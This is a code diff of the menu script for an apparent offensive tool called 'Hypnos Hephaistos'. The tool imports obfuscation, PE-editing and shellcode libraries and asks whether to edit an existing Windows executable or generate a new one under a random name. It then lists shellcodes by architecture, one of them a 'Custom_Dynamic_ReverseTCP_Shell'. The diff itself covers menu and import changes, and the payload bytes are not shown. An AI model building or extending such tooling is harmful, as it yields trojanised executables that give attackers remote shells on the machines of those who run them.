@@ -1,27 +1,25 @@
 import os
 import sys
 import platform
-from SRC import LibDebug
-from SRC import LibObfuscator
-from SRC import LibByteEditor
-from SRC import LibPeAnnalyzer
-from SRC import LibShellcode
-from SRC import LibPeEditor
+sys.path.insert(0, sys.path[0].replace("\\SRC\\Core\\Modules", ""))
+
+from SRC.Libs import LibDebug
+from SRC.Libs import LibObfuscator
+from SRC.Libs import LibByteEditor
+from SRC.Libs import LibPeAnnalyzer
+from SRC.Libs import LibShellcode
+from SRC.Libs import LibPeEditor
 
 Color = LibDebug.COLORS()
-Env = LibDebug.ENV()
+Env = LibDebug.CheckEnv()
+LibDebug.CheckHypnosReq()
 
 def menu():
-    LibDebug.Log(
-        "WORK", "This program use NASM, and ld. Please check that there are installed before using it.")
-    if Env.SYSTEM != "Windows":
-        LibDebug.Log("ERROR", "Only working on windows at the moment..")
-
     outputfile = LibObfuscator.RandomizedString(7) + ".exe"
 
     print(
         Color.GREEN + "Welcome to " + Color.RED +
-        "Heapnos Standalone Version__" + Color.RESET
+        "Hypnos Hephaistos Version__" + Color.RESET
     )
     print(
         "Do you want to " + Color.BLUE + "specify an executable" + Color.RESET + " to edit or did you want me to " + Color.BLUE + "generate one" + Color.RESET + " ? [" + Color.YELLOW + "edit" + Color.RESET + "/" + Color.YELLOW + "generate" + Color.RESET + "] or [" + Color.YELLOW + "e" + Color.RESET + "/" + Color.YELLOW + "g" + Color.RESET + "] : ", end=""
@@ -58,16 +56,17 @@ def menu():
     )
 
     shellcodes = []
-    for (dirpath, dirnames, filenames) in os.walk("ASM/ShellCodes"):
+    for (dirpath, _, filenames) in os.walk("ASM/ShellCodes"):
         for file in filenames:
-            if "dev" not in dirpath.split("\\"):
+            if "dev" not in dirpath.split("\\") :
                 shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
 
     case = []
     for i in range(0, len(shellcodes)):
-        case += str(i)
-        print("     " + Color.GREEN + str(i) +
-              Color.RESET + " - " + shellcodes[i])
+        if shellcodes[i].split("/")[1] == Env.ARCH:
+            case += str(i)
+            print("     " + Color.GREEN + str(i) +
+                Color.RESET + " - " + shellcodes[i])
 
     value = input("Select one shellcode : ")
     shellcode = LibShellcode.SHELLCODE()
@@ -75,7 +74,7 @@ def menu():
         LibDebug.Log("SUCCESS", shellcodes[int(
             value)] + " successfuly loaded.")
         LibDebug.Log("WORK", "Generating the shellcode..")
-        selection = shellcodes[int(value)].replace("Windows/","")
+        selection = shellcodes[int(value)].replace("Windows/" + Env.ARCH + "/","")
         try:
             if selection == "Custom_Dynamic_ReverseTCP_Shell":
                 print("Please enter your " + Color.YELLOW +
